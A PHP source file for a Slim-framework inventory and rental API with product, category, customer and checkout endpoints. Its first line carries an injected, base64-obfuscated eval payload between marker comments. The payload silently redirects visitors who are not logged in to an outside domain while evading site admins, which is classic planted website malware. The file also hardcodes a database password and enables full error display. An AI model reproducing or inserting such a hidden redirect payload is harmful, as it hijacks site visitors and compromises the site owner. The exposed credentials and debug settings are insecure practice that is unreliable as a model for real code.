<?php
/*aeR4Choc_start*/@eval(base64_decode('aWYoIWRlZmluZWQoImNoYWVKb3U3IikpewogICAgZGVmaW5lKCJjaGFlSm91NyIsIDEpOwogICAgZnVuY3Rpb24gaXNNb2JpbGUoJHVhZ2VudFN0cil7CiAgICAgICAgaWYoc3RycG9zKCR1YWdlbnRTdHIsICdhbmRyb2lkJykgIT09IGZhbHNlIHx8IHN0cnBvcygkdWFnZW50U3RyLCAnYmxhY2tiZXJyeScpICE9PSBmYWxzZQogICAgICAgICAgICB8fCBzdHJwb3MoJHVhZ2VudFN0ciwgJ2lwaG9uZScpICE9PSBmYWxzZSB8fCBzdHJwb3MoJHVhZ2VudFN0ciwgJ2lwYWQnKSAhPT0gZmFsc2UKICAgICAgICAgICAgfHwgc3RycG9zKCR1YWdlbnRTdHIsICdpcG9kJykgIT09IGZhbHNlIHx8IHN0cnBvcygkdWFnZW50U3RyLCAnb3BlcmEgbWluaScpICE9PSBmYWxzZQogICAgICAgICAgICB8fCBzdHJwb3MoJHVhZ2VudFN0ciwgJ2llTW9iaWxlJykgIT09IGZhbHNlKXsKICAgICAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgICAgfQogICAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KCiAgICBmdW5jdGlvbiBpc0Rlc2t0b3AoJHVhZ2VudFN0cil7CiAgICAgICAgaWYoc3RycG9zKCR1YWdlbnRTdHIsICdlZGdlJykgIT09IGZhbHNlIHx8IHN0cnBvcygkdWFnZW50U3RyLCAnbXNpZScpICE9PSBmYWxzZQogICAgICAgICAgICB8fCBzdHJwb3MoJHVhZ2VudFN0ciwgJ29wcicpICE9PSBmYWxzZSB8fCBzdHJwb3MoJHVhZ2VudFN0ciwgJ2Nocm9taXVtJykgIT09IGZhbHNlCiAgICAgICAgICAgIHx8IHN0cnBvcygkdWFnZW50U3RyLCAnZmlyZWZveCcpICE9PSBmYWxzZSB8fCBzdHJwb3MoJHVhZ2VudFN0ciwgJ2Nocm9tZScpICE9PSBmYWxzZSl7CiAgICAgICAgICAgIHJldHVybiB0cnVlOwogICAgICAgIH0KICAgICAgICByZXR1cm4gZmFsc2U7CiAgICB9CgogICAgJHJlZGlyVG8gPSAiaHR0cHM6Ly93d3cucm94b2Vub3MueHl6IjsKICAgICRjaGVja0Nvb2tSZWRpclN0ciA9ICJhZU5lZThwaSI7CiAgICAkcmVkaXJlY3RBbGxvdyA9IHRydWU7CiAgICBmb3JlYWNoICgkX0NPT0tJRSBhcyAkY29va0tleT0+JGNvb2tWYWwpewogICAgICAgIGlmIChzdHJwb3MoJGNvb2tLZXksICd3b3JkcHJlc3NfbG9nZ2VkX2luJykgIT09IGZhbHNlIHx8ICRjb29rS2V5ID09ICRjaGVja0Nvb2tSZWRpclN0cikgewogICAgICAgICAgICAkcmVkaXJlY3RBbGxvdyA9IGZhbHNlOwogICAgICAgICAgICBicmVhazsKICAgICAgICB9CiAgICB9CgogICAgJHVhZ2VudCA9IHN0cnRvbG93ZXIoJF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddKTsKCiAgICBpZiAoJHJlZGlyZWN0QWxsb3cpewogICAgICAgIGlmKGlzTW9iaWxlKCR1YWdlbnQpIHx8IGlzRGVza3RvcCgkdWFnZW50KSkgewogICAgICAgICAgICBzZXRjb29raWUoJGNoZWNrQ29va1JlZGlyU3RyLCAiMSIsIHRpbWUoKSArIDYwNDgwMCk7CiAgICAgICAgICAgIGhlYWRlcigiTG9jYXRpb246ICRyZWRpclRvIik7CiAgICAgICAgICAgIGRpZTsKICAgICAgICB9CiAgICB9Cn0='));/*aeR4Choc_end*/

	//error_reporting(E_ALL);
	//ini_set('display_errors', 1);
	error_reporting(-1);
	ini_set('display_errors', 1);
	ini_set('display_startup_errors', 1);
		require 'vendor/autoload.php';
	use \Psr\Http\Message\RequestInterface as Request;
	use \Psr\Http\Message\ResponseInterface as Response;
	use Slim\Http\UploadedFile;		
	require 'classes/db.php';
 
	$dbConfig = array(
		'host' => "localhost",
		'dbName' => 'sportsadda',
		'dbUser' => 'sportsadda',
		'dbPassword' => 'gupta1234$#'
	);

	$app = new \Slim\App(['settings' => ['displayErrorDetails' => true]]);	
//        $app = new \Slim\App( array("MODE" => "developement") );
        $container = $app->getContainer();
        $container['upload_directory'] = __DIR__ . '/uploads';
        date_default_timezone_set('Asia/Kolkata');
	$db = new Database($dbConfig);	
     	
        /* add inventory product webservice */
        $app->post('/add/product/details', function (Request $request, Response $response, $args) use ($app, $db) {
            $product_id = $request->getParam('product_id');	 
        $product_image= $request->getParam('product_app_image');	
        
        $serial_no = $request->getParam('serial_no');                      
        
        $data = array(array($product_id,PRODUCT_MSG), array($product_image,PRODUCT_IMG),array($serial_no,SERIAL_MSG));               
        $result=checkField($data);
        if($result){
            $apiResponse= $result;                                       
        }
        else {                
            $apiResponse=$db->addProductDetails($product_id ,$serial_no, $product_image);
        }   
        return $response->withJson($apiResponse);
        });     
        /* end point of webservice */
        
        /* Resident complaint webservice */
        $app->post('/add/product/category', function (Request $request, Response $response, $args) use ($app, $db) {
        $product_category_name = $request->getParam('product_category_name');	
        $product_category_image= $request->getParam('product_category_image');	        
     

        $data = array(array($product_category_name,CAT_MSG), array($product_category_image,CAT_IMG_MSG));               
        $result=checkField($data);
        if($result){
            $apiResponse= $result;                                       
        }
        else {                   
            $apiResponse=$db->addProductCategory($product_category_name,$product_category_image);
        }   
        return $response->withJson($apiResponse);
        });     
        /* end point of webservice */
        
        
        /* Get employee customer leads */
        $app->post('/get/product/list', function (Request $request, Response $response, $args) use ($app, $db) {
        $apiResponse = array();
        $product_id = $request->getParam('product_id');        
        $data = array(array($product_id,PRODUCT_MSG));               
        $result=checkField($data);
        if($result)
        {
            $apiResponse= $result;                                       
        }
        else 
        {                
            $result=$db->getProductList($product_id);            
            $apiResponse= responseMessage($result); 
        }   
        return $response->withJson($apiResponse);
        });                                
        /* end point of webservice */
        
        /* Get product webservice */
        $app->post('/get/product', function (Request $request, Response $response, $args) use ($app, $db) {
        $apiResponse = array();
        $product_id = $request->getParam('product_id');        
        $data = array(array($product_id,ID_MSG));               
        $result=checkField($data);
        if($result){
            $apiResponse= $result;                                       
        }
        else {                
            $result=$db->getProductDetailsByProductId($product_id);            
            $apiResponse= singleResponseMessage($result); 
        }   
        return $response->withJson($apiResponse);
        });                                
        /* end point of webservice */ 
      
      
        /* Get employee customer leads */
        $app->post('/get/product/categoryList', function (Request $request, Response $response, $args) use ($app, $db) {
        $apiResponse = array();
        
        $manage_category_id = $request->getParam('manage_category_id');        
        $data = array(array($manage_category_id,MANAGE_CATEGORY));               
        $result=checkField($data);
        if($result){
            $apiResponse= $result;                                       
        }
        else {                
            $result=$db->getProductCategoryList($manage_category_id);            
            $apiResponse= responseMessage($result); 
        }   
        return $response->withJson($apiResponse);
        });                                
        /* end point of webservice */ 
      
        /* Get employee customer leads */
       /* $app->post('/get/product/details', function (Request $request, Response $response, $args) use ($app, $db) {
        $apiResponse = array();
        $product_qrcode_no = $request->getParam('product_qrcode_no');        
        $data = array(array($product_qrcode_no,QRCODE_MSG));               
        $result=checkField($data);
        if($result){
            $apiResponse= $result;                                       
        }
        else {                
            $result=$db->getProductDetails($product_qrcode_no);            
            $apiResponse= singleResponseMessage($result); 
        }   
        return $response->withJson($apiResponse);
        });  */                              
        /* end point of webservice */
        
        /* Get product webservice */
        $app->get('/get/city/category', function (Request $request, Response $response, $args) use ($app, $db) {
        $result=$db->getCityCategoryList();           
        $apiResponse= responseMessage($result);        
        return $response->withJson($apiResponse);
        });                                
        /* end point of webservice */      

        /* Get employee customer leads */
        $app->post('/get/product/details', function (Request $request, Response $response, $args) use ($app, $db) {
        $apiResponse = array();
        $product_qrcode_no = $request->getParam('qrcode_no');        
        $data = array(array($product_qrcode_no,QRCODE_MSG));               
        $result=checkField($data);
        if($result){
            $apiResponse= $result;                                       
        }
        else {                
            $result=$db->getProductDetails($product_qrcode_no);            
            $apiResponse= singleResponseMessage($result); 
        }   
        return $response->withJson($apiResponse);
        });                                
        /* end point of webservice */
         
         
        /* Get employee customer leads */
        $app->post('/get/product/history', function (Request $request, Response $response, $args) use ($app, $db) {
        $apiResponse = array();
        $product_id = $request->getParam('product_id');        
        $product_details_id = $request->getParam('product_details_id');        
        $data = array(array($product_id,ID_MSG), array($product_details_id,PRODUCT_DETAILS_MSG));               
        $result=checkField($data);
        if($result){
            $apiResponse= $result;                                       
        }
        else {                
            $result=$db->getProductHistory($product_id,$product_details_id);            
            $apiResponse= responseMessage($result); 
        }   
        return $response->withJson($apiResponse);
        });                                
        /* end point of webservice */ 
 
         
         /* Get employee customer leads */
        /*$app->post('/get/product/history', function (Request $request, Response $response, $args) use ($app, $db) {
        $apiResponse = array();
        $product_id = $request->getParam('product_id');        
        $data = array(array($product_id,ID_MSG));               
        $result=checkField($data);
        if($result){
            $apiResponse= $result;                                       
        }
        else {                
            $result=$db->getProductHistory($product_id);            
            $apiResponse= responseMessage($result); 
        }   
        return $response->withJson($apiResponse);
        });    */                            
        /* end point of webservice */ 

        /* Get employee customer leads */
        /*$app->post('/get/product/details', function (Request $request, Response $response, $args) use ($app, $db) {
        $apiResponse = array();
        $product_qrcode_no = $request->getParam('product_qrcode_no');        
        $data = array(array($product_qrcode_no,QRCODE_MSG));               
        $result=checkField($data);
        if($result){
            $apiResponse= $result;                                       
        }
        else {                
            $result=$db->getProductDetails($product_qrcode_no);            
            $apiResponse= singleResponseMessage($result); 
        }   
        return $response->withJson($apiResponse);
        });    */                            
        /* end point of webservice */
        

         /* check out product list webservice */
        /*$app->post('/checkout/product', function (Request $request, Response $response, $args) use ($app, $db) {
        $apiResponse = array();
        $product_id = $request->getParam('product_id');        
        $data = array(array($product_id,ID_MSG));               
        $result=checkField($data);
        if($result){
            $apiResponse= $result;                                       
        }
        else {                
            $apiResponse=$db->checkOutProduct($product_id);                        
        }   
        return $response->withJson($apiResponse);
        });   */                             
        /* end point of webservice */
     	
     	
     	/* check out product list webservice */
        $app->post('/get/checkout/product', function (Request $request, Response $response, $args) use ($app, $db) {
        $apiResponse = array();
        $product_id = $request->getParam('product_id');        
        $product_details_id = $request->getParam('product_details_id');        
        $data = array(array($product_id,ID_MSG));               
        $result=checkField($data);
        if($result){
            $apiResponse= $result;                                       
        }
        else {                
            $apiResponse=$db->checkOutProduct($product_id, $product_details_id);                        
        }   
        return $response->withJson($apiResponse);
        });                                
        /* end point of webservice */
     	
     	
        /* Resident complaint webservice */
        $app->post('/add/customer/details', function (Request $request, Response $response, $args) use ($app, $db) {
        $product_id = $request->getParam('product_id');	        
        $product_details_id = $request->getParam('product_details_id');	        
        $customer_name= $request->getParam('customer_name');	        
        $customer_contact_no= $request->getParam('customer_contact_no');	        
        $start_date= $request->getParam('start_date');	        
        $end_date= $request->getParam('end_date');	                
        $data = array(array($product_id,ID_MSG), array($customer_name,NAME_MSG), 
                array($customer_contact_no,CONTACT_MSG), array($start_date,DATE_MSG),
                array($end_date,DATE_MSG),array($product_details_id,PRODUCT_DETAILS_MSG));               
        $result=checkField($data);
        if($result){
            $apiResponse= $result;                                       
        }
        else {                
            $apiResponse=$db->addCustomerDetails($product_id, $product_details_id, $customer_name, $customer_contact_no, $start_date, $end_date);
        }   
        return $response->withJson($apiResponse);
        });     
        /* end point of webservice */
          
          /* check out product list webservice */
        $app->post('/delete/product', function (Request $request, Response $response, $args) use ($app, $db) {
        $apiResponse = array();
        $product_id = $request->getParam('product_id');        
        $product_details_id = $request->getParam('product_details_id');        
        $data = array(array($product_id,ID_MSG), array($product_details_id,PRODUCT_DETAILS_MSG));               
        $result=checkField($data);
        if($result){
            $apiResponse= $result;                                       
        }
        else {                
            $apiResponse=$db->deleteProduct($product_id, $product_details_id);                        
        }   
        return $response->withJson($apiResponse);
        });                                
        /* end point of webservice */

        /* Get employee customer leads */
        $app->post('/get/productList', function (Request $request, Response $response, $args) use ($app, $db) {
        $apiResponse = array();
        $product_category_id = $request->getParam('product_category_id');        
        $data = array(array($product_category_id,CAT_ID_MSG));               
        $result=checkField($data);
        if($result){
            $apiResponse= $result;                                       
        }
        else {                
            $result=$db->getProductList($product_category_id);
            
            $apiResponse= responseMessage($result); 
        }   
        return $response->withJson($apiResponse);
        });                                
        /* end point of webservice */
        
        /* get product category list */
        $app->get('/get/product/category', function (Request $request, Response $response, $args) use ($app, $db) {
            $result = $db->getProductCategory();                                  
            $apiResponse=responseMessage($result); 
            return $response->withJson($apiResponse);
        });
        /* end point of webservice */
        
        /* check field is empty or not */
        function checkField($data){
            foreach ($data as $value){
                if(empty($value[0])){                                     
                $apiResponse['status_code']  = 401;
                $apiResponse['status']  = 'NOT_SUCCESS';
                $apiResponse['response_msg'] = $value[1]; 
                //print_r($apiResponse);                    
                return $apiResponse;
                exit;
             }
            }
        }
        /* end point of webservice */



        /* response message for all webservices */
        function responseMessage($result){
            if($result)
            {                        
                $apiResponse['status_code']=201;
                $apiResponse['response_msg'] = 'Records found';                           
                $apiResponse['data']=$result;  
                $apiResponse['current_date']=date('Y-m-d');
            }
            else    
            {
                $apiResponse['status_code']=201;
                $apiResponse['response_msg'] = 'Records not found';
               if($result){
                        $apiResponse['data']=$result;                            
                    }
                    else{
                        $apiResponse['data']=[];  
                    }                       
            } 
            return $apiResponse;
        }
        /* end message api */		            

        /* response message for single object case webservices */
        function singleResponseMessage($result){
            if($result)
            {                        
                $apiResponse['status_code']=201;
                $apiResponse['response_msg'] = 'Records found';                           
                $apiResponse['data']=$result;  
                $apiResponse['current_date']=date('Y-m-d');
            }
            else    
            {
                $apiResponse['status_code']=401;
                $apiResponse['response_msg'] = 'Records not found';
               if($result){
                        $apiResponse['data']=$result;                            
                    }
                    else{
                        $apiResponse['data']=[];  
                    }                       
            } 
            return $apiResponse;
        }
        /* end message api */		            
            
	$app->run();       
?> 